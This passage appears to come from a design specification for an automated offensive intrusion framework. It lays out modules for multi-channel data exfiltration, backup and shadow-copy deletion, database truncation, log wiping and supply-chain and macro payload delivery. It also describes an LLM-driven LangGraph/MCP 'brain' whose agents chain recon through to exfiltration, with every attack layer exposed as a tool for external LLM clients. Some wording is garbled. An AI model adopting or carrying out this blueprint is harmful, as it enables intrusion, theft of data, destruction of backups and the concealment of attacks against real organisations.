### 15.4 Modul EXFIL PLANNER (channel Priority, kombinasi L20)
```
→ jika tersedia proxy/egress HTTPS (tanpa mitigasi) → ch-1..6 (Section 4.1)
→ jika DNS allowed egress → CH-DNS (chunk base32 di TXT/subdomain)
→ jika email allowed → SMTP (via user own cred) sub-subject cover
→ jika cloud sync apps (OneDrive) → abuse User-Agent → ch (legit service)
→ jika ICMP allowed → ICMP tunneling (V5)
→ fallback: biarkan di staging (queue) — 24h auto-retry (Resilience)
```
FALLBACK ORDER: TLS>DNS>TLS-legit>SMTP>ICMP>QUEUE>ALERT.

### 15.5 Exfil safety (dari v3.2 + hardening)
- chunk randomize order + padding (banyak chunk random time).
- setiap chunk di-chunk-ini encrypt; master key di memory only (wipe).
- TLS fingerprint rotate per-flight (Section 4.2); dst seteDAR di C2 pool.
- batasi ukuran per flight (max 40MB/hari per saluran) → auto-rotate.
- metadata terpisah (jangan campur dengan raw);  ttl 24h di staging.
- delete-after-upload (C2 ack) — clean ups.

### 15.6 Resilience (10 edge case)
```
EDGE-01 exfil channel closed: rotate endpoint → DNS tunnel → queue 24h
EDGE-02 scope too big: restrict via budget + prioritize label
EDGE-03 DLP/size burst: throttling reset + hash-pause (jitter)
EDGE-04 credential rotate → re-harvest (G5 session) 
EDGE-05 network changed (VPN>wifi): re-egress detect; resume channel
EDGE-06 host move: re-discover cluster (graph) 
EDGE-07 operator offline: cap at inc-buffer, batch flush ketika online
EDGE-08 DMS: purge staging + common store
EDGE-09 self-destruct: wipe chunk cache of staging dir
EDGE-10 forensic reboot: clear in-progress thread markers
```

### 15.7 Env/Adaptasi
- type collector di-pilih: dir windows / posix (path semantics), 
- per-user scope (current cred) vs system (by-run-as) — synthesize hash list.
- hadapkan throttle ke latency (ping) → adaptive throughput.

### 15.8 Test
```
CL-01 file walker 500k files no crash, hash dedup effective
CL-02 mail pull outlook server (dry) — label date-based
CL-03 staging encrypt chunk → mock collector (gilded verification)
CL-04 HTTP -> DNS failover simulated (drop port 443) → resume (<120s)
CL-05 screenshot/keylog selective (no full-screen) — scope de-minimis
CL-06 size budget: 200MB scope → 40MB/day → 5 day spread, hash continuity
CL-07 honeypot detector: fake doc (bunny hopper sample) → flagged
```

### 15.9 Usage
```
collect scope --path "C:\Users\jane\Documents" --classifier finance
collect harvest --fs --mail --chat --params "target egress 445"
collect stage --encrypt --budget 40 --labels conf
collect exfil --channel auto --test
```

### 15.10 Extra tools
- **DELTA_TRACKER** — differential dump (hanya perubahan di -scope) utk long-term.
- **COMMS_STEGO_PLANNER** — slottimg exfil di lalu lintas benign (video call 
   screenshare cloud idle) — advanced (opsional).
- **SMB_SHARE_SNIFFER** — soroti share/folder UNC yang akan tersinks akses dc.

---

## 16. LAYER 13 — DESTRUCTION & IMPACT

> Semua aksi destruction WAJIB melalui gate: `target clear`,
> blast-radius calc, rollback-plan, dan dry-run. Server produksi 3rd party
> tidak pernah jadi target default.

### 16.1 Modul BACKUP-DESTRUCTION (7 langkah terukur)

B1 **ENUM** — sumber cadangan: application backup, VSS copies, file share
   .bak/.bkp, SQL mirror/transaction log, VM Snapshot, cloud bucket,
   physical tape stage.
B2 **MAP** — blast: siapa yang punya copy, di mana, siapa butuh, berapa lama
   tenggat restorasi (RPO/RTO estimation) → lanjut "kill-list".
B3 **DELETE_APPLICATION** — sapu internal recovery: hapus / backup application.
B4 **DELETE_VSS** — vssadmin delete shadows /all (profil lokal).
B5 **VM_SNAPSHOT** — hapus snapshots (vCenter disk delete, VM snapshot 
   scavenge); jika admin hypervisor belum — skip.
B6 **FILE_DELETE** — jalankan per blok. kalau admin — rm -rf backup store (files).
B7 **PS_VERIFY** — verifikasi lenyap & buat laporan (poof report).

### 16.2 Modul SERVICE-DISRUPTION (6)
S1 stop critical services (dcpromo, adfs, certsvc, exchange, sqlagent)
S2 kill processes (rp, web server workers) + memory freeze 
S3 network seg network (firewall block via policy snapshot)
S4 host availability (enable-safe shutdown agent) 
S5 scheduler halt (tasks disable)
S6 app secret disable (cert renew reject, token revoke attempts) — semi-destruction

### 16.3 Modul DATABASE-TRUNCATION (5)
D1 TRUNCATE / DELETE loops (with transaction log churn), D2 DROP TABLE via
   crafted chain (privilege escalate path), D3 DB detach/offline (mnt), 
D4 Transaction log overflow/truncate (grow-1TB trick), D5 Backup truncate
   (backup file zero-ize).

### 16.4 Modul INDICATOR WIPING (5)
W1 event log purge (full), W2 USN delete, W3 prefetch/amd purge,
W4 shell/browser history purge, W5 WMI/PS session record (RMM) purge —
   semuanya reroute ke L6 (log cleanup engine). Kelengkapan sampai
   level "sysadmin never weiss".

### 16.5 Modul PAYLOAD-SECURITY (2) — anti anti-wipe
P1 Honeypot-flag: bedakan dir yang disimpan supaya tidak dihapus 
   (konfig menuju hasil yang evolusi tetap tumbuh).
P2 Delete-beacon: selektif aksi relay oleh EDR (forensic only partial).

### 16.6 Fallback logic
```
enum → high-value → aplikasi → VSS → VM → files → verify
JIKA SEBAGIAN GAGAL: rute fallback: aplikasi yang rerun aneh.
Selama BARREL: 3 kali percobaan, lalu freeze & kasi alert (resilience).
```

### 16.7 Env / Edge / Test
```
EDGE-01 rollback threat (restore from remote dc) → B5 hapus remote snapshot 
EDGE-02 backup app auto-respawn → service-disruption S1 + B3 
EDGE-03 delayed restore (cloud versioning) → bucket version purge (B7)
EDGE-08 DMS → abort destruction (partial rollback attempt terukur)
EDGE-10 forensic snapshot → cek B2/B5 gap → patch stage
DS-01 dry-run on test-env (tiada target real) → verify per-modul
DS-02 scenario: 0 restore within 4h (victim RTO test) — simulated
DS-03 delete path b: job spooler bypass → dedup files gemir
DS-04 register every action (impact ledger) — audit-proof
```

### 16.8 Bilur etika/legal (soft gate)
- DEST COMPLETE adalah opsi terakhir dalam sign-off scope.
- Blast-radius harus: 0 death (crash), 0 collateral, 0 unintended tenant.
- Risk matrix: impact vs likelihood (user sign). bila >HI → manual confirm.

## 17. LAYER 14 — ORCHESTRATION ENGINE

> Dirancang sebagai "otak otomatis" yang menghubungkan semua layer; bukan cuma
> "data flow", tapi action-planner, task queue, adaptive scheduling, 
> dependency resolver, dan observability.

### 17.0 Struktur

```
orchestrator/
├── adapter/      # input plugin (sched, webhook, websocket, webhook2)
├── planner/      # task graph (DAG), priority, resource-aware
├── runner/       # executor pool (async/thread/process), sandbox isolation
├── coordinator/  # inter-agent message, locking, idempotency
├── checkpoint/   # durable state: orchestrator journal (saga pattern)
├── monitor/      # health, metrics, alerting, back-pressure
├── scheduler/    # cron + interval + event-driven (hybrid, kombinasi L15)
├── persistence/  # orchestrator state + task log (SQLite keyed)
└── event/        # integration ke EVENT_BUS v2 (Section 3.4)
```

### 17.1 Adapter (8 input sources)
A1 **CRON** — scheduled parse cron expression (macOS/Linux/Windows quartz).
A2 **HTTP_WEBHOOK** — API endpoint POST (trigger: phishing deploy callback, 
   lateral-move success sensor).
A3 **WEBSOCKET** — real-time stream (SIEM alert feed, C2 push event).
A4 **MQTT** — IoT / OT bridge (SCADA sensor callbacks — section L24).
A5 **FILE_WATCH** — inotify/ReadDirectoryChangesW (monitor share targets).
A6 **TIME_SIGNAL** — periodic heartbeat, NTP clock drift checker.
A7 **MANUAL_API** — human-init via REST (dashboard confirmations).
A8 **EVENT_BUS** — direct ke EVENT_BUS (Section 3.4) — internal message,
   semua event.

FALLBACK: A2→A3→A1→A5→A8 (ketika websocket down → webhook default → timer).

### 17.2 Planner (7 modul)
P1 **DAG_BUILDER** — task dependency graph; format: `{ id, deps[], exec[] }`.
P2 **PRIORITY_ENGINE** — urgency (score 1-100) × criticality (L14 brain score).
P3 **RESOURCE_AWARE** — cpu/memory/disk/net check sebelum dispatch; 
   back-pressure jika di bawah threshold.
P4 **SCHEDULER** — hybrid (cron + interval + event); kombinasi L15 brain
   untuk adaptive schedule.
P5 **DEPENDENCY_RESOLVER** — topological sort; deadlock detect; timeout per task.
P6 **BATCH_PLANNER** — parallel/serial config; fan-out/fan-in; DAG partitioning.
P7 **ADAPTIVE_RESCHEDULE** — jika task gagal → re-planner dengan factor alokasi
   berbeda (resource-aware, priority-aware).

### 17.3 Runner (6 execution modes)
R1 **ASYNC** — non-blocking task pool (libuv tokio-like event loop). 
R2 **THREAD** — per-task thread (untuk blocking I/O).
R3 **PROCESS** — sandbox isolated (container/VM micro; privilege segregation).
R4 **REMOTE** — execute di host lain via SSH/WMI/WinRM (L8).
R5 **SCHEDULED** — delayed execution (deferred queue).
R6 **WALLCLOCK** — real-time event (latency-sensitive, L6 sleep bypass).

### 17.4 Coordinator (5 components)
C1 **LOCK_MANAGER** — distributed lock (Redis/Memory) — idempotency key.
C2 **MESSAGE_BUS** — inter-agent: NATS/Kafka internal (opsional, default EVENT_BUS).
C3 **CONSISTENCY** — exactly-once semantics via idempotency token + journal.
C4 **RACE_CONDITION** — detect & resolve (happens-before edge).
C5 **DEADLOCK** — detect cycle + break (timeout + abort cascade).

### 17.5 Checkpoint (4) — durability
K1 **SAGA_JOURNAL** — write-ahead log untuk semua transisi; compaction.
K2 **SNAPSHOT** — periodic state snapshot ke disk (JSON + hash).
K3 **RECOVERY** — replay journal dari snapshot: re-execute incomplete tasks.
K4 **PRUNE** — expired entries cleanup, termasuk tombstone (sisa task abort).

### 17.6 Monitor (6)
M1 **HEALTH** — liveness/readiness probe per komponen.
M2 **METRICS** — CPU/disk/net per task, latency histogram, error rate.
M3 **ALERTING** — threshold-based ke EVENT_BUS + webhook.
M4 **BACK_PRESSURE** — rate-limit if runner overload.
M5 **TRACE** — distributed trace (trace ID, span tree) — optional.
M6 **LOGGING** — structured log (JSON) ke sink (file/siem).

### 17.7 Scheduler (4 hybrid modes)
S1 **CRON_ONLY** — simple scheduler (cron expression).
S2 **INTERVAL** — fixed interval (tick).
S3 **EVENT_DRIVEN** — reactive (event ke event-bus → trigger task).
S4 **HYBRID** — cron default; jika event-heavy → switch ke event-driven
   secara otomatis (kapasitas queue > threshold).

### 17.8 Persistence (4)
D1 **SQLITE_DB** — task log (id, status, start, end, result_hash).
D2 **JSONL_JOURNAL** — append-only log untuk replay.
D3 **STATE_SNAPSHOT** — periodic snapshot (full state).
D4 **CONFIG_STORE** — planner config, adapter weights.

### 17.9 Fallback & Edge (10)
```
EDGE-01: adapter down → switch to backup (A2→A1, A3→A2) → resume
EDGE-02: runner stuck → kill + respawn (R1→R3 isolated)
EDGE-03: checkpoint corrupt → replay from last healthy snapshot
EDGE-04: coordinator deadlock → break + abort cascade
EDGE-05: planner complexity explosion → DAG partitioning (P6)
EDGE-06: scheduler skew → NTP resync + recalibrate
EDGE-07: monitor blindspot → manual check (A7)
EDGE-08: event bus lost → queue replay from WAL
EDGE-09: persistence full → prune old entries (D4)
EDGE-10: full system failure → cold restart from last snapshot (K3)
```

### 17.10 Test
```
OR-01 DAG planner: 100-node task, no deadlock (P5)
OR-02 runner async: 500 tasks concurrent, no starvation
OR-03 checkpoint: crash mid-task → recovery intact (K3)
OR-04 coordinator: race condition simulation → no data loss
OR-05 adapter failover: A2 down → A1 resume
OR-06 back-pressure: runner overload → rate-limit kicks in
```

### 17.11 Usage
```
orch run --dag tasks.json --concurrency 8
orch schedule --cron "*/5 * * * *" --task collect_creds
orch checkpoint --snapshot
orch recovery --from snapshot.json
```

---

## 18. LAYER 15 — BRAIN (AI LOGIC / LangGraph Integration)

> Tidak lagi "sebutan" — diimplementasi penuh sebagai agent coordinator
> dengan LangGraph/MCP integration, multi-agent yang secara riil punya
> reasoning, decision, dan adaptasi.

### 18.0 Struktur

```
brain/
├── agents/        # per-role: recon, exploit, exfil, persistence, lateral
├── reasoning/     # LLM integration (local + remote), chain-of-thought
├── decision/      # policy engine: risk/score, priority, assignment
├── learning/      # experience cache, pattern library (no online training)
├── graph/         # LangGraph state machine (FSM + memory)
├── mcp/           # Model Context Protocol server
├── coord/         # multi-agent orchestration, message passing
└── guard/         # safety rails: blast-radius, legal, human-in-loop
```

### 18.1 AGENT DEFINITION (7 roles)

```
AGENT_RECON      — layer 17 (OSINT), 4 (enum), 7 (AD recon).
                  Input: scope, target, constraint. Output: asset graph.
AGENT_EXPLOIT    — layer 5 (SQLi/NoSQL), 18 (exploitation).
                  Input: vulnerabilities. Output: access vector.
AGENT_STEALTH    — layer 6 (evasion), 13 (destruction prep).
                  Input: action plan. Output: stealth-optimized plan.
AGENT_PERSIST    — layer 9 (persistence), 10 (rootkit).
                  Input: access vector. Output: persistence method + test.
AGENT_CREDENTIAL — layer 11 (cred theft), layer 8 (lateral prep).
                  Input: target asset. Output: cred material.
AGENT_LATERAL    — layer 8 (lateral movement), layer 7 (AD escalation).
                  Input: cred material + network. Output: pivot path.
AGENT_COLLECT    — layer 12 (collector), layer 20 (exfil), layer 23 (net evas).
                  Input: target data. Output: staged exfil.
```

### 18.2 REASONING ENGINE (5)

R1 **CHAIN_OF_THOUGHT** — prompt template per agent: 
   `Observation → Hypothesis → Decision → Action → Verification`.
R2 **SCORING** — 1-100 risk score per decision (edr-exposure, detection-probability,
   blast-radius, time-cost, resource-usage).
R3 **REPLAN** — if decision fails → replan with new factors (learned).
R4 **MEMORY** — conversation memory (short-term), experience cache (long-term).
R5 **HALLUCINATION_GUARD** — verify all outputs against real system state
   (TECH_LEDGER, ENV_DETECT); reject unverified claims.

### 18.3 DECISION ENGINE (5)

D1 **POLICY_ENGINE** — rule-based: `IF risk_score > 80 THEN abort; 
   IF edr_level = high THEN prefer indirect_methods; 
   IF blast_radius > 3 THEN manual_approval_required`.
D2 **RISK_CALCULATOR** — combine: detection_prob × impact × time_cost.
D3 **RESOURCE_ALLOCATOR** — assign agents, manage queue, throttle.
D4 **PRIORITY_SCHEDULER** — urgency × value (target high-value data first).
D5 **HUMAN_IN_LOOP** — for high-risk actions (destructive, lateral to prod DC),
   request confirmation via webhook (A7) or EVENT_BUS notification.

### 18.4 LEARNING & PATTERN (4)

L1 **EXPERIENCE_CACHE** — successful technique combos stored (per target type).
L2 **PATTERN_LIBRARY** — attack patterns: "if service X → technique Y worked 80%".
L3 **FAILURE_DB** — failed attempts → reason → avoid same path.
L4 **ADAPTIVE_WEIGHTS** — adjust fallback order per experience (not ML; heuristic).

### 18.5 LangGraph INTEGRATION (3)

G1 **STATE_GRAPH** — LangGraph StateGraph: `node(agent) → edge(condition) → node(agent)`.
   Memory: persistence checkpoint. Snapshot: end-of-phase.
G2 **TOOL_NODES** — LangGraph tools: each layer as a "tool" that agent can invoke.
   Tool selection: policy-based, not LLM-chosen (controlled autonomy).
G3 **HUMAN_NODE** — LangGraph interrupt: if `policy_engine.requires_approval`
   → pause → wait for human input → resume.

### 18.6 MCP SERVER (4)

M1 **MCP_TOOL_REGISTRY** — expose all layers as MCP tools (tool schema per layer).
   LLM clients (Claude, etc) can invoke tools via MCP protocol.
M2 **MCP_RESOURCE** — expose TECH_LEDGER, ENV_SCAN as MCP resources (read-only).
M3 **MCP_PROMPT** — prompt templates per agent (reusable).
M4 **MCP_SAMPLING** — optional: let external LLM do planning via MCP sampling.

### 18.7 COORDINATION (5)

C1 **AGENT_MESH** — agents communicate via EVENT_BUS (Section 3.4).
C2 **TASK_ASSIGNMENT** — brain assigns tasks to agents (priority, skill-match).
C3 **CONFLICT_RESOLUTION** — if two agents want same resource → priority resolve.
C4 **PHASE_TRANSITION** — recon → exploit → persist → lateral → collect → exfil.
   Each phase = LangGraph subgraph.
C5 **FULL_CYCLE_COORDINATOR** — end-to-end: recon to exfil; auto phase transition
   unless manual approval required.

### 18.8 GUARD RAILS (5)

G1 **BLAST_RADIUS** — max scope per action (IP range, file count, DC impact).
G2 **LEGAL_CHECK** — target classification (lab/production/third-party) → block.
G3 **NO_COLLATERAL** — ban actions affecting non-target systems.
G4 **AUDIT_LOG** — all decisions logged with reasoning (TRACE).
G5 **KILL_SWITCH** — emergency abort via EVENT_BUS command (L14 runner kill).

### 18.9 Fallback & Edge (10)
```
EDGE-01: LLM unavailable → fallback to rule-only (D1 policy, no R1 reasoning)
EDGE-02: agent crash → respawn + replay from checkpoint
EDGE-03: scoring drift → recalibrate with human feedback
EDGE-04: hallucination detected → HALLUCINATION_GUARD blocks + alert
EDGE-05: phase deadlock → human-in-loop resolve
EDGE-06: resource exhaustion → back-pressure to brain → throttle
EDGE-07: experience cache stale → re-learn from ENV_DETECT
EDGE-08: MCP server down → direct tool invocation (fallback)
EDGE-09: LangGraph error → state graph replay from last snapshot
EDGE-10: full brain failure → manual operator mode (A7 manual API)
```

### 18.10 Test
```
BR-01 recon agent: given target → produces asset graph (format correct)
BR-02 exploit agent: given vuln → chooses technique (score-based)
BR-03 decision engine: risk_score > 80 → abort (policy correct)
BR-04 replan: failed technique → replan with alternative (3x)
BR-05 hallucination guard: fake data → rejected (verify against ledger)
BR-06 LangGraph: full cycle (recon→exfil) → end-to-end success
BR-07 MCP: external LLM invokes tool → correct result
BR-08 kill switch: emergency abort → all tasks stopped
```

### 18.11 Usage
```
brain start --mode full-cycle --scope target.com
brain agent --role recon --target sub1.target.com
brain score --action "ESCALATE dc01" → risk: 85 → APPROVAL REQUIRED
brain decision --log brain_audit.json
brain stop --kill-switch
```

---

## 19. LAYER 16 — INFRASTRUCTURE

### 19.0 Struktur

```
infra/
├── cloud/         # AWS, Azure, GCP, OCI, DigitalOcean, Linode, Vultr
├── compose/       # docker-compose, k8s helm, ansible
├── terraform/     # IaC: provider config + modules
├── network/       # proxy, VPN, tunnel, DNS, reverse-proxy
├── hardening/     # OS hardening, SSH, firewall rules, container isolation
├── keystore/      # secrets management (Vault, SOPS, age, GPG)
└── provision/     # bootstrap scripts (cloud-init, kickstart, Packer)
```

### 19.1 Cloud Providers (12)

C1 **AWS** — EC2 + S3 + Route53 + Lambda + IAM policies. Template: Terraform
   with remote state (S3 backend). Account isolation per scope.
C2 **Azure** — VM + Blob + DNS + Functions + RBAC. ARM/Bicep templates.
   Subscription per scope, managed identity.
C3 **GCP** — Compute + Cloud DNS + Functions + IAM. Terraform + gcloud.
C4 **OCI** — compute + DNS + IAM. Terraform provider.
C5 **DigitalOcean** — droplet + spaces + DNS. Simple API.
C6 **Linode/Akamai** — compute + DNS.
C7 **Vultr** — compute + bare metal + DNS.
C8 **Hetzner** — compute + DNS (EU).
C9 **Cloudflare** — Workers + DNS + CDN (proxy/obfuscation).
C10 **Oracle** — RDS + autonomous DB (for decoy DB target).
C11 **Alibaba** — compute + DNS (APAC).
C12 **IBM** — compute + DNS (compliance-regulated).

FALLBACK: if primary region blocked → second provider (multi-cloud).

### 19.2 Compose (5)
D1 **DOCKER_COMPOSE** — C2 + proxy + dns + db containers.
D2 **KUBERNETES** — helm charts for each service.
D3 **ANSIBLE** — playbooks for provisioning + config management.
D4 **PACKER** — image building (golden AMI + hardening baked in).
D5 **NOMAD** — optional: if HashiCorp stack preferred.

### 19.3 Terraform (4)
T1 **MODULES** — reusable: vpc, compute, dns, storage, iam.
T2 **REMOTE_STATE** — S3 + DynamoDB lock (AWS), GCS + Cloud Lock (GCP).
T3 **WORKSPACES** — per-scope isolation (dev/staging/prod).
T4 **PLAN_OUTPUT** — `terraform plan` → validate before apply (gate).

### 19.4 Network (7)
N1 **PROXY** — nginx/caddy reverse proxy (TLS termination, header hide).
N2 **VPN** — WireGuard/OpenVPN mesh (site-to-site).
N3 **TUNNEL** — cloudflare tunnel / ngrok / frp (private→public).
N4 **DNS** — cloudflare / route53 / internal DNS server (per-scope).
N5 **REVERSE_PROXY** — Caddy/Acme (auto TLS cert + reverse proxy).
N6 **LOAD_BALANCER** — HAProxy/nginx (multi-C2 fallback, load distribution).
N7 **FIREWALL** — iptables/nftables/ufw (per-host rules, per-scope).

### 19.5 Hardening (5)
H1 **SSH** — key-only, port change, fail2ban, no root.
H2 **FIREWALL** — allowlist only required ports, deny all else.
H3 **CONTAINER_ISOLATION** — seccomp, apparmor, namespace, rootless.
H4 **AUTO_UPDATES** — unattended-upgrades for OS + packages.
H5 **AUDITD** — audit log for compliance (external: not ours).

### 19.6 Keystore (4)
K1 **VAULT** — HashiCorp Vault for secrets (dynamic creds, auto-rotate).
K2 **SOPS** — encrypted files (age/GPG) in repo.
K3 **AGE** — simple key management.
K4 **GPG** — traditional (if required).

### 19.7 Provision (4)
P1 **CLOUD_INIT** — user-data script for cloud instance bootstrap.
P2 **KICKSTART** — RHEL/CentOS automated install.
P3 **PACKER_IMAGE** — pre-hardened image for fast deploy.
P4 **BOOTSTRAP_SCRIPT** — bash/powershell for quick setup.

### 19.8 Fallback & Edge
```
EDGE-01: provider down → switch to backup cloud (C5→C7→C8)
EDGE-02: region blocked → migrate to second region
EDGE-03: cert expired → auto-renew via acme (Caddy/Cloudflare)
EDGE-04: container compromised → respawn from image (D5)
EDGE-05: VPN key leaked → rotate (N2 re-key)
EDGE-06: terraform state corrupt → restore from backup
EDGE-07: DNS poisoned → switch to provider DNS (N4 failover)
EDGE-08: firewall misconfigured → lock to default deny
EDGE-09: keystore breach → rotate all secrets (K1)
EDGE-10: full infra failure → rebuild from IaC (T1+D1)
```

### 19.9 Test
```
IF-01 deploy C2 on cloud provider X → success, TLS valid
IF-02 terraform plan → 0 errors, 0 drift
IF-03 docker compose up → all services healthy
IF-04 VPN mesh → 2 nodes connect, ping OK
IF-05 proxy → C2 backend invisible from outside (port scan clean)
IF-06 keystore → dynamic creds expire correctly
```

### 19.10 Usage
```
infra deploy --provider aws --scope prod-us --compose docker
infra terraform plan --workspace prod-us
infra vpn mesh --nodes 3 --protocol wireguard
infra keystore rotate --all
```

### 19.11 Extra tools
- **DECOY_INFRA** — honey pots (cowrie, tarpit) as perimeter sensors.
- **CANARY_TOKENS** — honey files/tokens planted on targets.
- **SHADOW_CLOUD** — hidden cloud account for backup infra.

---

## 20. LAYER 17 — OSINT / RECON (6 modules)

### 20.1 Domain Recon (5)
D1 **SUBDOMAIN_ENUM** — crt.sh, DNS brute, certificate transparency, 
   Subfinder/Amass integration.
D2 **WHOIS** — registrar info, historical records.
D3 **DNS_RECORDS** — A, AAAA, MX, NS, TXT, SOA, CNAME.
D4 **WEB_TECH** — Wappalyzer-like fingerprint (server, framework, CMS).
D5 **CERTIFICATE_ENUM** — certificate transparency logs, SAN enumeration.

### 20.2 IP/Network (5)
I1 **IP_SCAN** — port scan (nmap masscan integration).
I2 **ASN_LOOKUP** — BGP route, ASN ownership.
I3 **GEOIP** — location, ISP.
I4 **REVERSE_DNS** — PTR record, rDNS.
I5 **BANNER_CAPTURE** — service version fingerprint.

### 20.3 Web Recon (5)
W1 **WAYBACK** — historical pages (web.archive.org).
W2 **GOOGLE_DORK** — site:, filetype:, inurl:, intitle:, cache:.
W3 **S3_ENUM** — bucket enumeration (s3scanner).
W4 **ENDPOINT_DISC** — /robots.txt, /sitemap.xml, /.well-known, /api.
W5 **CMS_ENUM** — WordPress, Joomla, Drupal fingerprint.

### 20.4 People/Identity (5)
P1 **NAME_ENUM** — full name → email patterns (first.last, firstlast, f.last).
P2 **EMAIL_ENUM** — hunter.io, emailrep, verification.
P3 **SOCIAL_LINK** — LinkedIn, GitHub, Twitter, Facebook correlation.
P4 **BADGE_ENUM** — employee badges, conference speaker lists.
P5 **DATA_BREACH** — haveibeenpwned, dehashed, intelx.

### 20.5 Code/Dev (5)
G1 **GIT_ENUM** — .git exposure, GitHub/GitLab search (org repos).
G2 **SECRET_SCAN** — Trufflehog/Gitleaks (API keys, passwords in code).
G3 **CI_ENUM** — GitHub Actions, Jenkins, GitLab CI config (pipeline sniff).
G4 **CONTAINER_ENUM** — Docker Hub, ECR, GCR public images.
G5 **NPM_ENUM** — npm packages (author: target org), typosquat detection.

### 20.6 Tech Intel (5)
T1 **CVE_SCAN** — version → CVE (NVD, exploit-db integration).
T2 **EXPLOIT_AVAIL** — metasploit, nuclei, sqlmap module detection.
T3 **WAF_FINGERPRINT** — detect WAF vendor + version (W3af, wafw00f).
T4 **EDR_FINGERPRINT** — EDR/AV detection (process list, driver, service).
T5 **SHADOW_inventory** — hidden assets (subdomain takeover, expired domains).

### 20.7 Fallback
```
PASSIVE (no touch) → ACTIVE (light touch) → AGGRESSIVE (direct interaction)
by risk tolerance (configurable).
```

### 20.8 Env/Adaptasi
- rate-limit respect per source (no block).
- API key rotation per source.
- proxy chain untuk anonymity.

### 20.9 Test
```
OS-01 subdomain enum: 50 subdomains found for test domain (P0)
OS-02 secret scan: detect 10 test keys in test repo
OS-03 CVE: version → valid CVE list (accuracy >90%)
OS-04 EDR fingerprint: correct CrowdStrike/SentinelOne detection
```

### 20.10 Usage
```
osint domain --target corp.com --passive
osint code --repo github.com/testorg --secret-scan
osint people --name "John Doe" --breach-check
osint tech --target web.corp.com --cve-scan
```

### 20.11 Extra tools
- **ORG_MAP** — organizational structure (LinkedIn scrape + public records).
- **SUPPLY_CHAIN** — third-party vendor software dependency map.
- **DECEPTION_HONEYMAP** — detect planted honey tokens in recon output.

## 21. LAYER 18 — EXPLOITATION ENGINE

> Core exploitation framework: multiprotokol, auto-weaponization, adaptive
> payload delivery, dan integration dengan L14/15 (orchestrator/brain).

### 21.0 Struktur

```
exploit/
├── vulndb/        # CVE library + exploit modules (per-CVE + custom)
├── weaponize/     # payload generation (shellcode, DLL, exe, macro, LNK)
├── delivery/      # phishing, USB, web, supply-chain, cloud
├── trigger/       # fire mechanism (callback, reverse shell, bind, C2)
├── postexploit/   # initial foothold → persist (hand off to L9)
├── adapt/         # environment detection → technique selection
└── gate/          # safety: target classification, blast-radius check
```

### 21.1 VULNDB (6)

V1 **CVE_MODULE** — per-CVE exploit wrapper: input (target, version) → output (shellcode/stage).
   Format: `CVE-YYYY-NNNNN → detector → weaponizer → deliverer → trigger`.
V2 **Nuclei** — template-based: YAML templates → automatic scan + exploit.
   Integration: nuclei `-t cves/ -target tgt -json` → parse → weaponize.
V3 **Metasploit** — msfrpcd integration: `exploit/multi/handler` → session
   management → handoff to L9.
V4 **Custom_Fuzz** — simple fuzzer (HTTP/FTP/SMB/SMTP): mutate → send → crash/hang →
   analyze for RCE. Manual polish required.
V5 **PRIVESC** — local privesc database: Potato (Hot/Juicy/Winter), 
   PrintSpoofer, GodPotato, UACME, token impersonation, SeImpersonatePrivilege,
   named pipe (L2 mini-net), child process injection.
V6 **CHAIN** — multi-stage: Recon (L17) → Exploit (V1-V5) → Post-exploit (L9)
   → Lateral (L8) — chain built by Brain (L15) DAG planner.

### 21.2 WEAPONIZE (7 payload types)

P1 **SHELLCODE** — raw biner; format: position-free, null-free, multi-arch.
P2 **DLL_INJECT** — reflective DLL (L6 module-stomp); bypass W^X (Section 9.1).
P3 **MACRO** — VBA: auto-open + obfuscated (L6 AMSI bypass); payload via certutil
   or embedded (base64 decoded on-the-fly).
P4 **LNK** — shortcut: icon spoof + command (powershell/certutil/mshta).
P5 **HTA** — HTML Application: embedded script (VBScript/PowerShell).
P6 **ISO/USB** — autorun (L7 or custom) for air-gapped targets.
P7 **SUPPLY_CHAIN** — compromised package (npm/pypi/Docker image update);
   brain (L15) decides which dependency to poison.

### 21.3 DELIVERY (6 channels)

D1 **PHISHING** — email attachment (macro/LNK/HTA/ISO); pretexts from L17 OSINT.
D2 **PHISHING_LINK** — URL to hosted payload (cloud app, legitimate hosting abuse).
D3 **WEB_EXPLOIT** — server-side (SQLi→RCE L5, deserialization, SSRF).
D4 **USB_AIR_GAP** — USB drop / RogueUSB (HID) — for isolated networks.
D5 **SUPPLY_CHAIN** — upstream compromise (npm, pypi, docker, apt/yum repo).
D6 **CLOUD_APP** — malicious Lambda/Azure Function/Cloud Run endpoint (reverse connect).

### 21.4 TRIGGER (5)

T1 **REVERSE_SHELL** — TCP/HTTP/HTTPS reverse connect → C2 (L1).
T2 **BIND_SHELL** — listener on target (useful for pivot via SSH).
T3 **DNS_CALLBACK** — DNS-based C2 callback (Section 4.1 CH-12/13).
T4 **WEBHOOK** — HTTP POST to attacker endpoint (pre-configured).
T5 **FILE_BASED** — drop+execute (no network; for air-gapped).

### 21.5 POSTEXPLOIT (3)

PO1 **FOOTHOLD** — minimal shell → verify access → handoff to L9 (persistence).
PO2 **CREDS** — local enumeration → handoff to L11 (cred theft).
PO3 **ENUM** — local recon → handoff to L17 (OSINT) + L14 (orchestrator update).

### 21.6 ADAPT (environment-driven)

```
FINGERPRINT: from L17 T4 (EDR fingerprint) + ENV_DETECT (Section 3.2)
DECISION:
  EDR HIGH → prefer web exploit (D3) + server-side RCE (V3/V5)
  EDR LOW → prefer phishing (D1/D2) + macro (P3) + privesc (V5)
  AIR_GAP → prefer USB (D4/D6) + file-based (T5)
  SEGMENTED → prefer cloud (D6) + supply chain (D5)
```

### 21.7 GATE (safety)

```
G1 TARGET_CLASSIFICATION: 
  LAB (safe) → full exploit suite
  STAGING → limited, no destructive
  PROD → requires HUMAN_IN_LOOP (L15 D5) + blast-radius check
G2 BLAST_RADIUS: max affected systems per action; configurable per-scope.
G3 NO_COLLATERAL: ban actions affecting non-target systems.
```

### 21.8 Fallback & Edge (10)
```
EDGE-01: exploit fail → try alternative CVE (V1→V4→V3)
EDGE-02: payload blocked (AMSI) → L6 AMSI bypass → re-weaponize
EDGE-03: delivery channel blocked → switch channel (D1→D2→D3)
EDGE-04: callback not received → time check → retry with different T
EDGE-05: privesc fail → try alternative (V5 chain: Potato→PrintSpoofer→...)
EDGE-06: shell unstable → stabilize (python/sh.exe upgrade)
EDGE-07: target patched → stop (V2 nuclei: 0 vuln) → report
EDGE-08: C2 channel down → callback to backup C2 (Section 4.1 CH-18)
EDGE-09: AMSI/ETW patched → L6 amsi bypass → re-trigger
EDGE-10: sandbox detected → abort + notify brain (L15)
```

### 21.9 Test
```
EX-01 phish→macro→reverse shell (lab Outlook) → callback to C2
EX-02 SQLi→RCE (L5→L18 chain) → DB server shell
